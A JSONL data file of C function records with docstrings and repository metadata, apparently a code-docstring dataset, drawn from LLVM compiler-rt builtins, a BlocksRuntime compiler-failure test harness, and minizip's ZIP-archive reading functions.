{"docstring": "// Precondition: a != 0\n", "func_signal": "COMPILER_RT_ABI si_int __ctzsi2(si_int a)", "code": "{\n  su_int x = (su_int)a;\n  si_int t = ((x & 0x0000FFFF) == 0)\n             << 4; // if (x has no small bits) t = 16 else 0\n  x >>= t;         // x = [0 - 0xFFFF] + higher garbage bits\n  su_int r = t;    // r = [0, 16]\n  // return r + ctz(x)\n  t = ((x & 0x00FF) == 0) << 3;\n  x >>= t; // x = [0 - 0xFF] + higher garbage bits\n  r += t;  // r = [0, 8, 16, 24]\n  // return r + ctz(x)\n  t = ((x & 0x0F) == 0) << 2;\n  x >>= t; // x = [0 - 0xF] + higher garbage bits\n  r += t;  // r = [0, 4, 8, 12, 16, 20, 24, 28]\n  // return r + ctz(x)\n  t = ((x & 0x3) == 0) << 1;\n  x >>= t;\n  x &= 3; // x = [0 - 3]\n  r += t; // r = [0 - 30] and is even\n  // return r + ctz(x)\n\n  //  The branch-less return statement below is equivalent\n  //  to the following switch statement:\n  //     switch (x)\n  //    {\n  //     case 0:\n  //         return r + 2;\n  //     case 2:\n  //         return r + 1;\n  //     case 1:\n  //     case 3:\n  //         return r;\n  //     }\n  return r + ((2 - (x >> 1)) & -((x & 1) == 0));\n}", "path": "lib\\builtins\\ctzsi2.c", "repo_name": "llvm-mirror/compiler-rt", "stars": 290, "license": "other", "language": "c", "size": 38461}
{"docstring": "// Effects: sets *overflow to 1  if a * b overflows\n", "func_signal": "COMPILER_RT_ABI si_int __mulosi4(si_int a, si_int b, int *overflow)", "code": "{\n  const int N = (int)(sizeof(si_int) * CHAR_BIT);\n  const si_int MIN = (si_int)1 << (N - 1);\n  const si_int MAX = ~MIN;\n  *overflow = 0;\n  si_int result = a * b;\n  if (a == MIN) {\n    if (b != 0 && b != 1)\n      *overflow = 1;\n    return result;\n  }\n  if (b == MIN) {\n    if (a != 0 && a != 1)\n      *overflow = 1;\n    return result;\n  }\n  si_int sa = a >> (N - 1);\n  si_int abs_a = (a ^ sa) - sa;\n  si_int sb = b >> (N - 1);\n  si_int abs_b = (b ^ sb) - sb;\n  if (abs_a < 2 || abs_b < 2)\n    return result;\n  if (sa == sb) {\n    if (abs_a > MAX / abs_b)\n      *overflow = 1;\n  } else {\n    if (abs_a > MIN / -abs_b)\n      *overflow = 1;\n  }\n  return result;\n}", "path": "lib\\builtins\\mulosi4.c", "repo_name": "llvm-mirror/compiler-rt", "stars": 290, "license": "other", "language": "c", "size": 38461}
{"docstring": "// basic idea, take compiler args, run compiler, and verify that expected failure matches any existing one\n", "func_signal": "int main(int argc, char *argv[])", "code": "{\n    if (argc == 1) return 0;\n    char *copy[argc+1];   // make a copy\n    // find and strip off -e \"errorfile\"\n    char *errorfile = NULL;\n    int counter = 0, i = 0;\n    for (i = 1; i < argc; ++i) {    // skip 0 arg which is \"fail\"\n        if (!strncmp(argv[i], \"-e\", 2)) {\n            errorfile = argv[++i];\n        }\n        else {\n            copy[counter++] = argv[i];\n        }\n    }\n    copy[counter] = NULL;\n    pid_t child = fork();\n    char buffer[512];\n    if (child == 0) {\n        // in child\n        sprintf(buffer, \"/tmp/errorfile_%d\", getpid());\n        close(1);\n        int fd = creat(buffer, 0777);\n        if (fd != 1) {\n            fprintf(stderr, \"didn't open custom error file %s as 1, got %d\\n\", buffer, fd);\n            exit(1);\n        }\n        close(2);\n        dup(1);\n        int result = execv(copy[0], copy);\n        exit(10);\n    }\n    if (child < 0) {\n        printf(\"fork failed\\n\");\n        exit(1);\n    }\n    int status = 0;\n    pid_t deadchild = wait(&status);\n    if (deadchild != child) {\n        printf(\"wait got %d instead of %d\\n\", deadchild, child);\n        exit(1);\n    }\n    if (WEXITSTATUS(status) == 0) {\n        printf(\"compiler exited normally, not good under these circumstances\\n\");\n        exit(1);\n    }\n    //printf(\"exit status of child %d was %d\\n\", child, WEXITSTATUS(status));\n    sprintf(buffer, \"/tmp/errorfile_%d\", child);\n    if (errorfile) {\n        //printf(\"ignoring error file: %s\\n\", errorfile);\n        char desired[512];\n        char got[512];\n        bool gotErrorFile = readfile(desired, errorfile);\n        bool gotOutput = readfile(got, buffer);\n        if (!gotErrorFile && gotOutput) {\n            printf(\"didn't read errorfile %s, it should have something from\\n*****\\n%s\\n*****\\nin it.\\n\",\n                errorfile, got);\n            exit(1);\n        }\n        else if (gotErrorFile && gotOutput) {\n            char *where = strstr(got, desired);\n            if (!where) {\n                printf(\"didn't find contents of %s in %s\\n\", errorfile, buffer);\n                exit(1);\n            }\n        }\n        else {\n            printf(\"errorfile %s and output %s inconsistent\\n\", errorfile, buffer);\n            exit(1);\n        }\n    }\n    unlink(buffer);\n    printf(\"success\\n\");\n    exit(0);\n}", "path": "test\\BlocksRuntime\\fail.c", "repo_name": "llvm-mirror/compiler-rt", "stars": 290, "license": "other", "language": "c", "size": 38461}
{"docstring": "/*\n  Close the file in zip opened with unzipOpenCurrentFile\n  Return UNZ_CRCERROR if all the file was read but the CRC is not good\n*/\n", "func_signal": "extern int ZEXPORT unzCloseCurrentFile (unzFile file)", "code": "{\n    int err=UNZ_OK;\n\n    unz64_s* s;\n    file_in_zip64_read_info_s* pfile_in_zip_read_info;\n    if (file==NULL)\n        return UNZ_PARAMERROR;\n    s=(unz64_s*)file;\n    pfile_in_zip_read_info=s->pfile_in_zip_read;\n\n    if (pfile_in_zip_read_info==NULL)\n        return UNZ_PARAMERROR;\n\n\n    if ((pfile_in_zip_read_info->rest_read_uncompressed == 0) &&\n        (!pfile_in_zip_read_info->raw))\n    {\n        if (pfile_in_zip_read_info->crc32 != pfile_in_zip_read_info->crc32_wait)\n            err=UNZ_CRCERROR;\n    }\n\n\n    TRYFREE(pfile_in_zip_read_info->read_buffer);\n    pfile_in_zip_read_info->read_buffer = NULL;\n    if (pfile_in_zip_read_info->stream_initialised == Z_DEFLATED)\n        inflateEnd(&pfile_in_zip_read_info->stream);\n#ifdef HAVE_BZIP2\n    else if (pfile_in_zip_read_info->stream_initialised == Z_BZIP2ED)\n        BZ2_bzDecompressEnd(&pfile_in_zip_read_info->bstream);\n#endif\n\n\n    pfile_in_zip_read_info->stream_initialised = 0;\n    TRYFREE(pfile_in_zip_read_info);\n\n    s->pfile_in_zip_read=NULL;\n\n    return err;\n}", "path": "novel-design\\SSZipArchive\\minizip\\unzip.c", "repo_name": "ltebean/novel-design", "stars": 335, "license": "None", "language": "c", "size": 3471}
{"docstring": "/* My own strcmpi / strcasecmp */\n", "func_signal": "local int strcmpcasenosensitive_internal (const char* fileName1, const char* fileName2)", "code": "{\n    for (;;)\n    {\n        char c1=*(fileName1++);\n        char c2=*(fileName2++);\n        if ((c1>='a') && (c1<='z'))\n            c1 -= 0x20;\n        if ((c2>='a') && (c2<='z'))\n            c2 -= 0x20;\n        if (c1=='\\0')\n            return ((c2=='\\0') ? 0 : -1);\n        if (c2=='\\0')\n            return 1;\n        if (c1<c2)\n            return -1;\n        if (c1>c2)\n            return 1;\n    }\n}", "path": "novel-design\\SSZipArchive\\minizip\\unzip.c", "repo_name": "ltebean/novel-design", "stars": 335, "license": "None", "language": "c", "size": 3471}
{"docstring": "/*\n  Give the current position in uncompressed data\n*/\n", "func_signal": "extern z_off_t ZEXPORT unztell (unzFile file)", "code": "{\n    unz64_s* s;\n    file_in_zip64_read_info_s* pfile_in_zip_read_info;\n    if (file==NULL)\n        return UNZ_PARAMERROR;\n    s=(unz64_s*)file;\n    pfile_in_zip_read_info=s->pfile_in_zip_read;\n\n    if (pfile_in_zip_read_info==NULL)\n        return UNZ_PARAMERROR;\n\n    return (z_off_t)pfile_in_zip_read_info->stream.total_out;\n}", "path": "novel-design\\SSZipArchive\\minizip\\unzip.c", "repo_name": "ltebean/novel-design", "stars": 335, "license": "None", "language": "c", "size": 3471}
{"docstring": "/*\n  return 1 if the end of file was reached, 0 elsewhere\n*/\n", "func_signal": "extern int ZEXPORT unzeof (unzFile file)", "code": "{\n    unz64_s* s;\n    file_in_zip64_read_info_s* pfile_in_zip_read_info;\n    if (file==NULL)\n        return UNZ_PARAMERROR;\n    s=(unz64_s*)file;\n    pfile_in_zip_read_info=s->pfile_in_zip_read;\n\n    if (pfile_in_zip_read_info==NULL)\n        return UNZ_PARAMERROR;\n\n    if (pfile_in_zip_read_info->rest_read_uncompressed == 0)\n        return 1;\n    else\n        return 0;\n}", "path": "novel-design\\SSZipArchive\\minizip\\unzip.c", "repo_name": "ltebean/novel-design", "stars": 335, "license": "None", "language": "c", "size": 3471}
{"docstring": "/*\n  Read bytes from the current file.\n  buf contain buffer where data must be copied\n  len the size of buf.\n\n  return the number of byte copied if somes bytes are copied\n  return 0 if the end of file was reached\n  return <0 with error code if there is an error\n    (UNZ_ERRNO for IO error, or zLib error for uncompress error)\n*/\n", "func_signal": "extern int ZEXPORT unzReadCurrentFile  (unzFile file, voidp buf, unsigned len)", "code": "{\n    int err=UNZ_OK;\n    uInt iRead = 0;\n    unz64_s* s;\n    file_in_zip64_read_info_s* pfile_in_zip_read_info;\n    if (file==NULL)\n        return UNZ_PARAMERROR;\n    s=(unz64_s*)file;\n    pfile_in_zip_read_info=s->pfile_in_zip_read;\n\n    if (pfile_in_zip_read_info==NULL)\n        return UNZ_PARAMERROR;\n\n\n    if (pfile_in_zip_read_info->read_buffer == NULL)\n        return UNZ_END_OF_LIST_OF_FILE;\n    if (len==0)\n        return 0;\n\n    pfile_in_zip_read_info->stream.next_out = (Bytef*)buf;\n\n    pfile_in_zip_read_info->stream.avail_out = (uInt)len;\n\n    // NOTE:\n    // This bit of code seems to try to set the amount of space in the output buffer based on the\n    // value stored in the headers stored in the .zip file. However, if those values are incorrect\n    // it may result in a loss of data when uncompresssing that file. The compressed data is still\n    // legit and will deflate without knowing the uncompressed code so this tidbit is unnecessary and\n    // may cause issues for some .zip files.\n    //\n    // It's removed in here to fix those issues.\n    //\n    // See: https://github.com/samsoffes/ssziparchive/issues/16\n    //\n    \n    /*\n    if ((len>pfile_in_zip_read_info->rest_read_uncompressed) &&\n        (!(pfile_in_zip_read_info->raw)))\n        pfile_in_zip_read_info->stream.avail_out =\n            (uInt)pfile_in_zip_read_info->rest_read_uncompressed;\n     */\n\n    if ((len>pfile_in_zip_read_info->rest_read_compressed+\n           pfile_in_zip_read_info->stream.avail_in) &&\n         (pfile_in_zip_read_info->raw))\n        pfile_in_zip_read_info->stream.avail_out =\n            (uInt)pfile_in_zip_read_info->rest_read_compressed+\n            pfile_in_zip_read_info->stream.avail_in;\n\n    while (pfile_in_zip_read_info->stream.avail_out>0)\n    {\n        if ((pfile_in_zip_read_info->stream.avail_in==0) &&\n            (pfile_in_zip_read_info->rest_read_compressed>0))\n        {\n            uInt uReadThis = UNZ_BUFSIZE;\n            if (pfile_in_zip_read_info->rest_read_compressed<uReadThis)\n                uReadThis = (uInt)pfile_in_zip_read_info->rest_read_compressed;\n            if (uReadThis == 0)\n                return UNZ_EOF;\n            if (ZSEEK64(pfile_in_zip_read_info->z_filefunc,\n                      pfile_in_zip_read_info->filestream,\n                      pfile_in_zip_read_info->pos_in_zipfile +\n                         pfile_in_zip_read_info->byte_before_the_zipfile,\n                         ZLIB_FILEFUNC_SEEK_SET)!=0)\n                return UNZ_ERRNO;\n            if (ZREAD64(pfile_in_zip_read_info->z_filefunc,\n                      pfile_in_zip_read_info->filestream,\n                      pfile_in_zip_read_info->read_buffer,\n                      uReadThis)!=uReadThis)\n                return UNZ_ERRNO;\n\n\n#            ifndef NOUNCRYPT\n            if(s->encrypted)\n            {\n                uInt i;\n                for(i=0;i<uReadThis;i++)\n                  pfile_in_zip_read_info->read_buffer[i] =\n                      zdecode(s->keys,s->pcrc_32_tab,\n                              pfile_in_zip_read_info->read_buffer[i]);\n            }\n#            endif\n\n\n            pfile_in_zip_read_info->pos_in_zipfile += uReadThis;\n\n            pfile_in_zip_read_info->rest_read_compressed-=uReadThis;\n\n            pfile_in_zip_read_info->stream.next_in =\n                (Bytef*)pfile_in_zip_read_info->read_buffer;\n            pfile_in_zip_read_info->stream.avail_in = (uInt)uReadThis;\n        }\n\n        if ((pfile_in_zip_read_info->compression_method==0) || (pfile_in_zip_read_info->raw))\n        {\n            uInt uDoCopy,i ;\n\n            if ((pfile_in_zip_read_info->stream.avail_in == 0) &&\n                (pfile_in_zip_read_info->rest_read_compressed == 0))\n                return (iRead==0) ? UNZ_EOF : iRead;\n\n            if (pfile_in_zip_read_info->stream.avail_out <\n                            pfile_in_zip_read_info->stream.avail_in)\n                uDoCopy = pfile_in_zip_read_info->stream.avail_out ;\n            else\n                uDoCopy = pfile_in_zip_read_info->stream.avail_in ;\n\n            for (i=0;i<uDoCopy;i++)\n                *(pfile_in_zip_read_info->stream.next_out+i) =\n                        *(pfile_in_zip_read_info->stream.next_in+i);\n\n            pfile_in_zip_read_info->total_out_64 = pfile_in_zip_read_info->total_out_64 + uDoCopy;\n\n            pfile_in_zip_read_info->crc32 = crc32(pfile_in_zip_read_info->crc32,\n                                pfile_in_zip_read_info->stream.next_out,\n                                uDoCopy);\n            pfile_in_zip_read_info->rest_read_uncompressed-=uDoCopy;\n            pfile_in_zip_read_info->stream.avail_in -= uDoCopy;\n            pfile_in_zip_read_info->stream.avail_out -= uDoCopy;\n            pfile_in_zip_read_info->stream.next_out += uDoCopy;\n            pfile_in_zip_read_info->stream.next_in += uDoCopy;\n            pfile_in_zip_read_info->stream.total_out += uDoCopy;\n            iRead += uDoCopy;\n        }\n        else if (pfile_in_zip_read_info->compression_method==Z_BZIP2ED)\n        {\n#ifdef HAVE_BZIP2\n            uLong uTotalOutBefore,uTotalOutAfter;\n            const Bytef *bufBefore;\n            uLong uOutThis;\n\n            pfile_in_zip_read_info->bstream.next_in        = (char*)pfile_in_zip_read_info->stream.next_in;\n            pfile_in_zip_read_info->bstream.avail_in       = pfile_in_zip_read_info->stream.avail_in;\n            pfile_in_zip_read_info->bstream.total_in_lo32  = pfile_in_zip_read_info->stream.total_in;\n            pfile_in_zip_read_info->bstream.total_in_hi32  = 0;\n            pfile_in_zip_read_info->bstream.next_out       = (char*)pfile_in_zip_read_info->stream.next_out;\n            pfile_in_zip_read_info->bstream.avail_out      = pfile_in_zip_read_info->stream.avail_out;\n            pfile_in_zip_read_info->bstream.total_out_lo32 = pfile_in_zip_read_info->stream.total_out;\n            pfile_in_zip_read_info->bstream.total_out_hi32 = 0;\n\n            uTotalOutBefore = pfile_in_zip_read_info->bstream.total_out_lo32;\n            bufBefore = (const Bytef *)pfile_in_zip_read_info->bstream.next_out;\n\n            err=BZ2_bzDecompress(&pfile_in_zip_read_info->bstream);\n\n            uTotalOutAfter = pfile_in_zip_read_info->bstream.total_out_lo32;\n            uOutThis = uTotalOutAfter-uTotalOutBefore;\n\n            pfile_in_zip_read_info->total_out_64 = pfile_in_zip_read_info->total_out_64 + uOutThis;\n\n            pfile_in_zip_read_info->crc32 = crc32(pfile_in_zip_read_info->crc32,bufBefore, (uInt)(uOutThis));\n            pfile_in_zip_read_info->rest_read_uncompressed -= uOutThis;\n            iRead += (uInt)(uTotalOutAfter - uTotalOutBefore);\n\n            pfile_in_zip_read_info->stream.next_in   = (Bytef*)pfile_in_zip_read_info->bstream.next_in;\n            pfile_in_zip_read_info->stream.avail_in  = pfile_in_zip_read_info->bstream.avail_in;\n            pfile_in_zip_read_info->stream.total_in  = pfile_in_zip_read_info->bstream.total_in_lo32;\n            pfile_in_zip_read_info->stream.next_out  = (Bytef*)pfile_in_zip_read_info->bstream.next_out;\n            pfile_in_zip_read_info->stream.avail_out = pfile_in_zip_read_info->bstream.avail_out;\n            pfile_in_zip_read_info->stream.total_out = pfile_in_zip_read_info->bstream.total_out_lo32;\n\n            if (err==BZ_STREAM_END)\n              return (iRead==0) ? UNZ_EOF : iRead;\n            if (err!=BZ_OK)\n              break;\n#endif\n        } // end Z_BZIP2ED\n        else\n        {\n            ZPOS64_T uTotalOutBefore,uTotalOutAfter;\n            const Bytef *bufBefore;\n            ZPOS64_T uOutThis;\n            int flush=Z_SYNC_FLUSH;\n\n            uTotalOutBefore = pfile_in_zip_read_info->stream.total_out;\n            bufBefore = pfile_in_zip_read_info->stream.next_out;\n\n            /*\n            if ((pfile_in_zip_read_info->rest_read_uncompressed ==\n                     pfile_in_zip_read_info->stream.avail_out) &&\n                (pfile_in_zip_read_info->rest_read_compressed == 0))\n                flush = Z_FINISH;\n            */\n            err=inflate(&pfile_in_zip_read_info->stream,flush);\n\n            if ((err>=0) && (pfile_in_zip_read_info->stream.msg!=NULL))\n              err = Z_DATA_ERROR;\n\n            uTotalOutAfter = pfile_in_zip_read_info->stream.total_out;\n            uOutThis = uTotalOutAfter-uTotalOutBefore;\n\n            pfile_in_zip_read_info->total_out_64 = pfile_in_zip_read_info->total_out_64 + uOutThis;\n\n            pfile_in_zip_read_info->crc32 =\n                crc32(pfile_in_zip_read_info->crc32,bufBefore,\n                        (uInt)(uOutThis));\n\n            pfile_in_zip_read_info->rest_read_uncompressed -=\n                uOutThis;\n\n            iRead += (uInt)(uTotalOutAfter - uTotalOutBefore);\n\n            if (err==Z_STREAM_END)\n                return (iRead==0) ? UNZ_EOF : iRead;\n            if (err!=Z_OK)\n                break;\n        }\n    }\n\n    if (err==Z_OK)\n        return iRead;\n    return err;\n}", "path": "novel-design\\SSZipArchive\\minizip\\unzip.c", "repo_name": "ltebean/novel-design", "stars": 335, "license": "None", "language": "c", "size": 3471}
{"docstring": "/*\n  Read the local header of the current zipfile\n  Check the coherency of the local header and info in the end of central\n        directory about this file\n  store in *piSizeVar the size of extra info in local header\n        (filename and size of extra field data)\n*/\n", "func_signal": "local int unz64local_CheckCurrentFileCoherencyHeader (unz64_s* s, uInt* piSizeVar,\n                                                    ZPOS64_T * poffset_local_extrafield,\n                                                    uInt  * psize_local_extrafield)", "code": "{\n    uLong uMagic,uData,uFlags;\n    uLong size_filename;\n    uLong size_extra_field;\n    int err=UNZ_OK;\n\n    *piSizeVar = 0;\n    *poffset_local_extrafield = 0;\n    *psize_local_extrafield = 0;\n\n    if (ZSEEK64(s->z_filefunc, s->filestream,s->cur_file_info_internal.offset_curfile +\n                                s->byte_before_the_zipfile,ZLIB_FILEFUNC_SEEK_SET)!=0)\n        return UNZ_ERRNO;\n\n\n    if (err==UNZ_OK)\n    {\n        if (unz64local_getLong(&s->z_filefunc, s->filestream,&uMagic) != UNZ_OK)\n            err=UNZ_ERRNO;\n        else if (uMagic!=0x04034b50)\n            err=UNZ_BADZIPFILE;\n    }\n\n    if (unz64local_getShort(&s->z_filefunc, s->filestream,&uData) != UNZ_OK)\n        err=UNZ_ERRNO;\n/*\n    else if ((err==UNZ_OK) && (uData!=s->cur_file_info.wVersion))\n        err=UNZ_BADZIPFILE;\n*/\n    if (unz64local_getShort(&s->z_filefunc, s->filestream,&uFlags) != UNZ_OK)\n        err=UNZ_ERRNO;\n\n    if (unz64local_getShort(&s->z_filefunc, s->filestream,&uData) != UNZ_OK)\n        err=UNZ_ERRNO;\n    else if ((err==UNZ_OK) && (uData!=s->cur_file_info.compression_method))\n        err=UNZ_BADZIPFILE;\n\n    if ((err==UNZ_OK) && (s->cur_file_info.compression_method!=0) &&\n/* #ifdef HAVE_BZIP2 */\n                         (s->cur_file_info.compression_method!=Z_BZIP2ED) &&\n/* #endif */\n                         (s->cur_file_info.compression_method!=Z_DEFLATED))\n        err=UNZ_BADZIPFILE;\n\n    if (unz64local_getLong(&s->z_filefunc, s->filestream,&uData) != UNZ_OK) /* date/time */\n        err=UNZ_ERRNO;\n\n    if (unz64local_getLong(&s->z_filefunc, s->filestream,&uData) != UNZ_OK) /* crc */\n        err=UNZ_ERRNO;\n    else if ((err==UNZ_OK) && (uData!=s->cur_file_info.crc) && ((uFlags & 8)==0))\n        err=UNZ_BADZIPFILE;\n\n    if (unz64local_getLong(&s->z_filefunc, s->filestream,&uData) != UNZ_OK) /* size compr */\n        err=UNZ_ERRNO;\n    else if (uData != 0xFFFFFFFF && (err==UNZ_OK) && (uData!=s->cur_file_info.compressed_size) && ((uFlags & 8)==0))\n        err=UNZ_BADZIPFILE;\n\n    if (unz64local_getLong(&s->z_filefunc, s->filestream,&uData) != UNZ_OK) /* size uncompr */\n        err=UNZ_ERRNO;\n    else if (uData != 0xFFFFFFFF && (err==UNZ_OK) && (uData!=s->cur_file_info.uncompressed_size) && ((uFlags & 8)==0))\n        err=UNZ_BADZIPFILE;\n\n    if (unz64local_getShort(&s->z_filefunc, s->filestream,&size_filename) != UNZ_OK)\n        err=UNZ_ERRNO;\n    else if ((err==UNZ_OK) && (size_filename!=s->cur_file_info.size_filename))\n        err=UNZ_BADZIPFILE;\n\n    *piSizeVar += (uInt)size_filename;\n\n    if (unz64local_getShort(&s->z_filefunc, s->filestream,&size_extra_field) != UNZ_OK)\n        err=UNZ_ERRNO;\n    *poffset_local_extrafield= s->cur_file_info_internal.offset_curfile +\n                                    SIZEZIPLOCALHEADER + size_filename;\n    *psize_local_extrafield = (uInt)size_extra_field;\n\n    *piSizeVar += (uInt)size_extra_field;\n\n    return err;\n}", "path": "novel-design\\SSZipArchive\\minizip\\unzip.c", "repo_name": "ltebean/novel-design", "stars": 335, "license": "None", "language": "c", "size": 3471}
{"docstring": "/*\n  Write info about the ZipFile in the *pglobal_info structure.\n  No preparation of the structure is needed\n  return UNZ_OK if there is no problem. */\n", "func_signal": "extern int ZEXPORT unzGetGlobalInfo64 (unzFile file, unz_global_info64* pglobal_info)", "code": "{\n    unz64_s* s;\n    if (file==NULL)\n        return UNZ_PARAMERROR;\n    s=(unz64_s*)file;\n    *pglobal_info=s->gi;\n    return UNZ_OK;\n}", "path": "novel-design\\SSZipArchive\\minizip\\unzip.c", "repo_name": "ltebean/novel-design", "stars": 335, "license": "None", "language": "c", "size": 3471}
{"docstring": "/*\ntypedef struct unz_file_pos_s\n{\n    ZPOS64_T pos_in_zip_directory;   // offset in file\n    ZPOS64_T num_of_file;            // # of file\n} unz_file_pos;\n*/\n", "func_signal": "extern int ZEXPORT unzGetFilePos64(unzFile file, unz64_file_pos*  file_pos)", "code": "{\n    unz64_s* s;\n\n    if (file==NULL || file_pos==NULL)\n        return UNZ_PARAMERROR;\n    s=(unz64_s*)file;\n    if (!s->current_file_ok)\n        return UNZ_END_OF_LIST_OF_FILE;\n\n    file_pos->pos_in_zip_directory  = s->pos_in_central_dir;\n    file_pos->num_of_file           = s->num_file;\n\n    return UNZ_OK;\n}", "path": "novel-design\\SSZipArchive\\minizip\\unzip.c", "repo_name": "ltebean/novel-design", "stars": 335, "license": "None", "language": "c", "size": 3471}
{"docstring": "/*\n   Compare two filename (fileName1,fileName2).\n   If iCaseSenisivity = 1, comparision is case sensitivity (like strcmp)\n   If iCaseSenisivity = 2, comparision is not case sensitivity (like strcmpi\n                                                                or strcasecmp)\n   If iCaseSenisivity = 0, case sensitivity is defaut of your operating system\n        (like 1 on Unix, 2 on Windows)\n\n*/\n", "func_signal": "extern int ZEXPORT unzStringFileNameCompare (const char*  fileName1,\n                                                 const char*  fileName2,\n                                                 int iCaseSensitivity)", "code": "{\n    if (iCaseSensitivity==0)\n        iCaseSensitivity=CASESENSITIVITYDEFAULTVALUE;\n\n    if (iCaseSensitivity==1)\n        return strcmp(fileName1,fileName2);\n\n    return STRCMPCASENOSENTIVEFUNCTION(fileName1,fileName2);\n}", "path": "novel-design\\SSZipArchive\\minizip\\unzip.c", "repo_name": "ltebean/novel-design", "stars": 335, "license": "None", "language": "c", "size": 3471}
{"docstring": "/*\n  Try locate the file szFileName in the zipfile.\n  For the iCaseSensitivity signification, see unzipStringFileNameCompare\n\n  return value :\n  UNZ_OK if the file is found. It becomes the current file.\n  UNZ_END_OF_LIST_OF_FILE if the file is not found\n*/\n", "func_signal": "extern int ZEXPORT unzLocateFile (unzFile file, const char *szFileName, int iCaseSensitivity)", "code": "{\n    unz64_s* s;\n    int err;\n\n    /* We remember the 'current' position in the file so that we can jump\n     * back there if we fail.\n     */\n    unz_file_info64 cur_file_infoSaved;\n    unz_file_info64_internal cur_file_info_internalSaved;\n    ZPOS64_T num_fileSaved;\n    ZPOS64_T pos_in_central_dirSaved;\n\n\n    if (file==NULL)\n        return UNZ_PARAMERROR;\n\n    if (strlen(szFileName)>=UNZ_MAXFILENAMEINZIP)\n        return UNZ_PARAMERROR;\n\n    s=(unz64_s*)file;\n    if (!s->current_file_ok)\n        return UNZ_END_OF_LIST_OF_FILE;\n\n    /* Save the current state */\n    num_fileSaved = s->num_file;\n    pos_in_central_dirSaved = s->pos_in_central_dir;\n    cur_file_infoSaved = s->cur_file_info;\n    cur_file_info_internalSaved = s->cur_file_info_internal;\n\n    err = unzGoToFirstFile(file);\n\n    while (err == UNZ_OK)\n    {\n        char szCurrentFileName[UNZ_MAXFILENAMEINZIP+1];\n        err = unzGetCurrentFileInfo64(file,NULL,\n                                    szCurrentFileName,sizeof(szCurrentFileName)-1,\n                                    NULL,0,NULL,0);\n        if (err == UNZ_OK)\n        {\n            if (unzStringFileNameCompare(szCurrentFileName,\n                                            szFileName,iCaseSensitivity)==0)\n                return UNZ_OK;\n            err = unzGoToNextFile(file);\n        }\n    }\n\n    /* We failed, so restore the state of the 'current file' to where we\n     * were.\n     */\n    s->num_file = num_fileSaved ;\n    s->pos_in_central_dir = pos_in_central_dirSaved ;\n    s->cur_file_info = cur_file_infoSaved;\n    s->cur_file_info_internal = cur_file_info_internalSaved;\n    return err;\n}", "path": "novel-design\\SSZipArchive\\minizip\\unzip.c", "repo_name": "ltebean/novel-design", "stars": 335, "license": "None", "language": "c", "size": 3471}
{"docstring": "/*\n  Write info about the ZipFile in the *pglobal_info structure.\n  No preparation of the structure is needed\n  return UNZ_OK if there is no problem.\n*/\n", "func_signal": "extern int ZEXPORT unzGetCurrentFileInfo64 (unzFile file,\n                                          unz_file_info64 * pfile_info,\n                                          char * szFileName, uLong fileNameBufferSize,\n                                          void *extraField, uLong extraFieldBufferSize,\n                                          char* szComment,  uLong commentBufferSize)", "code": "{\n    return unz64local_GetCurrentFileInfoInternal(file,pfile_info,NULL,\n                                                szFileName,fileNameBufferSize,\n                                                extraField,extraFieldBufferSize,\n                                                szComment,commentBufferSize);\n}", "path": "novel-design\\SSZipArchive\\minizip\\unzip.c", "repo_name": "ltebean/novel-design", "stars": 335, "license": "None", "language": "c", "size": 3471}
{"docstring": "/*\n  Close a ZipFile opened with unzipOpen.\n  If there is files inside the .Zip opened with unzipOpenCurrentFile (see later),\n    these files MUST be closed with unzipCloseCurrentFile before call unzipClose.\n  return UNZ_OK if there is no problem. */\n", "func_signal": "extern int ZEXPORT unzClose (unzFile file)", "code": "{\n    unz64_s* s;\n    if (file==NULL)\n        return UNZ_PARAMERROR;\n    s=(unz64_s*)file;\n\n    if (s->pfile_in_zip_read!=NULL)\n        unzCloseCurrentFile(file);\n\n    ZCLOSE64(s->z_filefunc, s->filestream);\n    TRYFREE(s);\n    return UNZ_OK;\n}", "path": "novel-design\\SSZipArchive\\minizip\\unzip.c", "repo_name": "ltebean/novel-design", "stars": 335, "license": "None", "language": "c", "size": 3471}
{"docstring": "/*\n   Translate date/time from Dos format to tm_unz (readable more easilty)\n*/\n", "func_signal": "local void unz64local_DosDateToTmuDate (ZPOS64_T ulDosDate, tm_unz* ptm)", "code": "{\n    ZPOS64_T uDate;\n    uDate = (ZPOS64_T)(ulDosDate>>16);\n    ptm->tm_mday = (uInt)(uDate&0x1f) ;\n    ptm->tm_mon =  (uInt)((((uDate)&0x1E0)/0x20)-1) ;\n    ptm->tm_year = (uInt)(((uDate&0x0FE00)/0x0200)+1980) ;\n\n    ptm->tm_hour = (uInt) ((ulDosDate &0xF800)/0x800);\n    ptm->tm_min =  (uInt) ((ulDosDate&0x7E0)/0x20) ;\n    ptm->tm_sec =  (uInt) (2*(ulDosDate&0x1f)) ;\n}", "path": "novel-design\\SSZipArchive\\minizip\\unzip.c", "repo_name": "ltebean/novel-design", "stars": 335, "license": "None", "language": "c", "size": 3471}
{"docstring": "/* Additions by RX '2004 */\n", "func_signal": "extern ZPOS64_T ZEXPORT unzGetOffset64(unzFile file)", "code": "{\n    unz64_s* s;\n\n    if (file==NULL)\n          return 0; //UNZ_PARAMERROR;\n    s=(unz64_s*)file;\n    if (!s->current_file_ok)\n      return 0;\n    if (s->gi.number_entry != 0 && s->gi.number_entry != 0xffff)\n      if (s->num_file==s->gi.number_entry)\n         return 0;\n    return s->pos_in_central_dir;\n}", "path": "novel-design\\SSZipArchive\\minizip\\unzip.c", "repo_name": "ltebean/novel-design", "stars": 335, "license": "None", "language": "c", "size": 3471}
{"docstring": "/*\n  Set the current file of the zipfile to the first file.\n  return UNZ_OK if there is no problem\n*/\n", "func_signal": "extern int ZEXPORT unzGoToFirstFile (unzFile file)", "code": "{\n    int err=UNZ_OK;\n    unz64_s* s;\n    if (file==NULL)\n        return UNZ_PARAMERROR;\n    s=(unz64_s*)file;\n    s->pos_in_central_dir=s->offset_central_dir;\n    s->num_file=0;\n    err=unz64local_GetCurrentFileInfoInternal(file,&s->cur_file_info,\n                                             &s->cur_file_info_internal,\n                                             NULL,0,NULL,0,NULL,0);\n    s->current_file_ok = (err == UNZ_OK);\n    return err;\n}", "path": "novel-design\\SSZipArchive\\minizip\\unzip.c", "repo_name": "ltebean/novel-design", "stars": 335, "license": "None", "language": "c", "size": 3471}
